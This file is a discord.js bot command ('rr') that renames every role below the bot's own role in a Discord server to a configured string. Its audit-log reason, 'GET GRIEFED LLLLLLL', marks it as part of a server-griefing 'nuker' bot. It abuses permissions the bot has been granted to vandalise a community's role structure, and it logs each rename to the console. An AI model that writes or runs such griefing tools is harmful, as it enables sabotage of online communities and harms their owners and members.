const { Client, Message, Permissions } = require("discord.js");
require('colors');

module.exports = {
    name: 'rr',
    description: 'Renames all roles.',

    /**
     * 
     * @param {Client} bot 
     * @param {Message} message 
     * @param {String[]} parts 
     */

    async execute(bot, message, parts) {
        message.guild.roles.cache.forEach(async r => {
            if(!message.guild.me.hasPermission('MANAGE_ROLES')) return console.log(`${`[ERROR]`.red} ${`Missing Permission 'MANAGE_ROLES' on Guild ${message.guild.name}!`.yellow}`)
            if(r.position < message.guild.me.roles.highest.position) {
                let success = r.setName(bot.cfg.messages.renameRoles, `GET GRIEFED LLLLLLL`)
                if(success) console.log(`${`[SUCCESS]`.green} ${`Successfully renamed role '${r.name}' to '${bot.cfg.messages.renameRoles}'!`.yellow}`);
                else console.log(`${`[ERROR]`.red} An unknown Error ocurred while renaming Role '${r.name}'!`)
            } else {
                console.log(`${`[ERROR]`.red} ${`Missing Permissions for Role '${r.name}' because its to high!`.yellow}`);
            }
        })
    }
}